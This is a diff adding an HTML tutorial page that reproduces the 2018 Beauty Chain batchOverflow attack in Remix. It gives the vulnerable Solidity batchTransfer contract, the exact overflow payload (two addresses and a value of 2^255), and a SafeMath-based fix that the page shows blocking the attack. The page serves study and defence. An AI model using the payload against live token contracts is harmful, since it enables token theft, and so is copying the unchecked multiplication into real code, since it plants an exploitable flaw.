@@ -1,0 +1,72 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Test locally the Attack</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>Test locally the Attack</h1><br /><br /><strong>Vulnerable code exploited during Beauty Chain
+      Batch Overflow 2018</strong><br />The code from Beauty Chain is been little bit updated, to meet the current
+    compiler standards with a few small tweaks and some functions so you can check your balance during the stages of the
+    attack.<br />Original vulnerable code: <a
+      href="https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code" target="_blank">https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code</a><br />Vulnerable
+    Code updated by @Ficti0n to Solidity 0.6.6: <a
+      href="https://github.com/cclabsInc/BlockChainExploitation/tree/master/2020_BlockchainFreeCourse/integerAttacks" target="_blank">https://github.com/cclabsInc/BlockChainExploitation/tree/master/2020_BlockchainFreeCourse/integerAttacks</a><br />
+    <div class="codebox">
+      <div class="codebox">pragma&nbsp;solidity&nbsp;0.6.6;&nbsp;<br /><br />contract&nbsp;BEC_Vuln&nbsp;<span
+          style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;mapping&nbsp;(address=&gt;uint)&nbsp;balances;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;batchTransfer(address[]&nbsp;memory&nbsp;_receivers,&nbsp;uint256&nbsp;_value)&nbsp;public&nbsp;payable&nbsp;returns&nbsp;(bool)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint&nbsp;cnt&nbsp;=&nbsp;_receivers.length;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint256&nbsp;amount&nbsp;=&nbsp;uint256(cnt)&nbsp;*&nbsp;_value;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;require(cnt&nbsp;&gt;&nbsp;0&nbsp;&amp;&amp;&nbsp;cnt&nbsp;&lt;=&nbsp;20);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;require(_value&nbsp;&gt;&nbsp;0&nbsp;&amp;&amp;&nbsp;balances[msg.sender]&nbsp;&gt;=&nbsp;amount);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;balances[msg.sender]&nbsp;=&nbsp;balances[msg.sender]&nbsp;-&nbsp;amount;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(uint&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;cnt;&nbsp;i++)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;balances[_receivers[i]]&nbsp;=&nbsp;balances[_receivers[i]]&nbsp;+&nbsp;_value;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//transfer(msg.sender,&nbsp;_receivers[i],&nbsp;_value);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;deposit()&nbsp;public&nbsp;payable{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;balances[msg.sender]&nbsp;=&nbsp;msg.value;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;getBalance()&nbsp;public&nbsp;view&nbsp;returns&nbsp;(uint){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;balances[msg.sender];<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><span
+          style="color:#000000;font-weight:400">}</span></div>
+    </div><br /><br /><strong><span style="color:#ff0000;">Attack input </span></strong><br />For test purpose we can
+    use <a href="http://remix.ethereum.org/" target="_blank">http://remix.ethereum.org/</a><br /> ◇ address[] memory _receivers →
+    [&quot;0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB&quot;,&quot;0x617F2E2fD72FD9D5503197092aC168c91465E7f2&quot;]<br />
+    ◇ uint256 _value →<br /> ▪ hexadecimal → 0x8000000000000000000000000000000000000000000000000000000000000000<br />
+    <div class="codebox">
+      <div class="codebox">
+        [&quot;0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB&quot;,&quot;0x617F2E2fD72FD9D5503197092aC168c91465E7f2&quot;],0x8000000000000000000000000000000000000000000000000000000000000000
+      </div>
+    </div><br /> ▪ decimal → 57896044618658097711785492504343953926634992332820282019728792003956564819968<br />
+    <div class="codebox">
+      <div class="codebox">
+        [&quot;0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB&quot;,&quot;0x617F2E2fD72FD9D5503197092aC168c91465E7f2&quot;],57896044618658097711785492504343953926634992332820282019728792003956564819968
+      </div>
+    </div><br /> <a href=""><img src="images/1412-1.png" alt="images/1412-1.png" /></a><br />After the attack to the
+    balance of the two receivers address will be added
+    57896044618658097711785492504343953926634992332820282019728792003956564819968 tokens, while the balance of the
+    sender will remain unchanged<br /><br /><strong>
+      <h3>Fixing the erc20 overflow vulnerability</h3>
+    </strong><br /><strong>IMPORTANT</strong>: <a
+      href="https://soliditydeveloper.com/solidity-0.8#:~:text=Integrated%20SafeMath" target="_blank">from solidity 0.8 the SafeMath
+      library is integrated in mathematical operations</a><br />As always in application security, we should use
+    opensource well vetted security libraries for coding projects. Ethereum is no exception to this rule and has its own
+    opensource libraries from OpenZeppelin which handle anything from safe mathematical calculations to role based
+    authentication. <br />This is the math library:<br /> <a
+      href="https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol" target="_blank">https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol</a><br />This
+    is how import into our code under the pragma solidity definition:<br />
+    <div class="codebox">
+      <div class="codebox">
+        pragma&nbsp;solidity&nbsp;0.6.6;<br />import&nbsp;&quot;https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol&quot;;
+      </div>
+    </div><br />With the SafeMath library we can use for example these math functions:<br /> ◇ multiply →
+    SafeMath.mul(value1, value2)<br /> ◇ division → SafeMath.div(value1, value2)<br /> ◇ subtraction →
+    SafeMath.sub(value1, value2)<br /> ◇ addition → SafeMath.add(value1, value2)<br /><br />
+    <div class="codebox">
+      <div class="codebox">
+        pragma&nbsp;solidity&nbsp;0.6.6;<br />import&nbsp;&quot;https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol&quot;;<br /><br />contract&nbsp;BEC_Vuln&nbsp;<span
+          style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;mapping&nbsp;(address=&gt;uint)&nbsp;balances;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;batchTransfer(address[]&nbsp;memory&nbsp;_receivers,&nbsp;uint256&nbsp;_value)&nbsp;public&nbsp;payable&nbsp;returns&nbsp;(bool)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint&nbsp;cnt&nbsp;=&nbsp;_receivers.length;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uint256&nbsp;amount&nbsp;=&nbsp;SafeMath.mul(uint256(cnt),&nbsp;_value);&nbsp;&nbsp;&nbsp;//&lt;---changed<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;require(cnt&nbsp;&gt;&nbsp;0&nbsp;&amp;&amp;&nbsp;cnt&nbsp;&lt;=&nbsp;20);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;require(_value&nbsp;&gt;&nbsp;0&nbsp;&amp;&amp;&nbsp;balances[msg.sender]&nbsp;&gt;=&nbsp;amount);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;balances[msg.sender]&nbsp;=&nbsp;SafeMath.sub(balances[msg.sender],&nbsp;&nbsp;amount);&nbsp;&nbsp;&nbsp;//&lt;---&nbsp;changed<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(uint&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;cnt;&nbsp;i++)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;balances[_receivers[i]]&nbsp;=&nbsp;SafeMath.add(balances[_receivers[i]],&nbsp;&nbsp;_value);&nbsp;&nbsp;&nbsp;//&lt;---&nbsp;changed<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//transfer(msg.sender,&nbsp;_receivers[i],&nbsp;_value);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;deposit()&nbsp;public&nbsp;payable{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;balances[msg.sender]&nbsp;=&nbsp;msg.value;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;getBalance()&nbsp;public&nbsp;view&nbsp;returns&nbsp;(uint){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;balances[msg.sender];<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><span
+          style="color:#000000;font-weight:400">}</span></div>
+    </div><br /><br />Input data for the BatchTransfer function<br />
+    <div class="codebox">
+      <div class="codebox">
+        [&quot;0xdD870fA1b7C4700F2BD7f44238821C26f7392148&quot;,&quot;0x583031D1113aD414F02576BD6afaBfb302140225&quot;],0x8000000000000000000000000000000000000000000000000000000000000000
+      </div>
+    </div><br /><br />How we can see the attack will not work anymore<br /><a href=""><img src="images/1412-2.png"
+        alt="images/1412-2.png" /></a><br />
+  </div>
+</body>
+
+</html>
